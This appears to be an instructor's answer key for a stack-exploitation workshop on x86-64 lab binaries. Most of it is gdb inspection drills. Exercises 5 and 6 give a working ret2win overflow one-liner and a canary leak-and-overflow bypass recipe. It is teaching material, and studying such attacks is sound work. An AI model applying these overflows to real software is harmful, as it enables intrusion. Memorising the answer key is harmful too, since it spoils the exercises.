# Instructor walkthroughs & hints

Keep this out of participants' hands until they've struggled a bit. Timings
assume a 40-minute hands-on block; most people reach 5–6, strong people finish.

---

## 1 — Find the stack  (~2 min)
```
gdb -q ./bin/01_find_stack
b secret
run
x/5xb $rsp        # first 5 bytes
x/16xg $rsp       # the stack as 8-byte words
```
Hint if stuck: `$rsp` *is* the top of the stack. Find the `ST4CK!` bytes with
`search-pattern ST4CK` (GEF) or `find $rsp, +200, "ST4CK!"`.

## 2 — Saved return address  (~3 min)
```
b callee
run
info frame        # read "saved rip = 0x...."
x/gx $rbp+8       # same value, by hand
```
Confirm it falls inside `main` (`info line *<that addr>`). Teaching beat:
there is **no return register** for control flow — the address is just data on
the stack. That is the entire reason overflows give you RIP.

## 3 — Who called who  (~3 min)
```
b c
run
bt                # main -> a -> b -> c
x/2gx $rbp        # [saved rbp][saved rip]; follow saved rbp up one frame
x/2gx <that rbp>  # repeat to rebuild bt by hand
```

## 4 — Hexdump your input  (~3 min)
```
printf 'AAAABBBBCCCC' | gdb -q ./bin/04_hexdump
b echo
run
n                 # step past read()
x/64bx buf        # 0x41 0x41 ... that's you, sitting on the stack
```

## 5 — ret2win  (~7 min)
Offset = 64 (buffer) + 8 (saved RBP) = **72**, then the saved return address.
Verify the buffer offset: `disassemble vuln` and read the `lea`/`mov` that
sets up the `read` destination (`[rbp-0x40]`).

Manual, no tools:
```
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*72+struct.pack("<Q",0xWINADDR))' \
  | ./bin/05_ret2win
```
Get `0xWINADDR` from the program's own banner, or `info functions win`.
Scripted: `pip install pwntools && python3 solutions/exploit_05.py`.

Common miss: off-by-8 on the offset, or forgetting the address is
little-endian. Show them `cyclic 100` / `cyclic -l` (pwntools) to find offsets
mechanically.

## 6 — Defeat the canary  (~10 min)
Naive overflow first — let them *see* it die:
```
python3 -c 'print("200"); import sys; sys.stdout.flush()' ...   # or just run it and smash
# -> *** stack smashing detected ***: terminated
```
Then the two-stage bypass. The canary sits ~**72** bytes into `buf`; its lowest
byte is `0x00`.

1. **Leak:** answer `200` to the peek prompt, read the dumped bytes, pull the
   8-byte word at offset 72 (the one ending in `00`).
2. **Overflow:** `A*72 + canary + B*8 (saved rbp) + p64(win)`.

Full exploit: `python3 solutions/exploit_06.py`. If the offset is off, scan the
leak for the word whose low byte is `00` — that's the canary. Teaching beat:
the canary is re-randomized every run, so a hardcoded value won't work; you
must leak *this* run's value. That's why info-leak bugs are so prized.

## 7 — Leaf functions & the red zone  (~4 min)
```
gdb -q ./bin/07_leaf_O0 -ex 'disassemble leaf' -ex quit
gdb -q ./bin/07_leaf_O2 -ex 'disassemble leaf' -ex quit
```
`-O0` shows the textbook prologue (`push rbp; mov rbp,rsp; sub rsp,...`).
`-O2` often shows **no** frame setup and no `sub rsp` — the function scribbles
in the 128-byte red zone below RSP. Point: "where is the frame?" is a real
question, and the answer shapes how you reason about saved registers and
overflows.

## 8 — C++ complications  (~5 min, bonus)
```
b main
run
p a
x/gx a            # first 8 bytes = vtable pointer
info vtbl *a      # gdb decodes Dog's vtable; speak() points at Dog::speak
b risky
c                 # hit it 4x; bt grows main->...->risky x4
c                 # the throw unwinds every risky frame at once
```
Discussion hooks:
- Control the vtable pointer → control an indirect call (vs. ret2win's return
  address). Different primitive, same idea: hijack where execution goes next.
- Exception unwinding walks the stack via unwind tables, runs destructors, and
  interacts awkwardly with shadow-stack CFI — a nice bridge to the talk's
  hardware-mitigation section.

---

## If you want it harder
- Remove the `win()` address banner in `05` → they must find it with `gdb`/`nm`.
- Turn PIE back on (drop `-no-pie`) and keep ASLR → now they need a leak first.
- Add `-z now -Wl,-z,relro` and discuss GOT vs. ret2win.
- Build `06` without the leak primitive → brute-force / byte-by-byte canary.
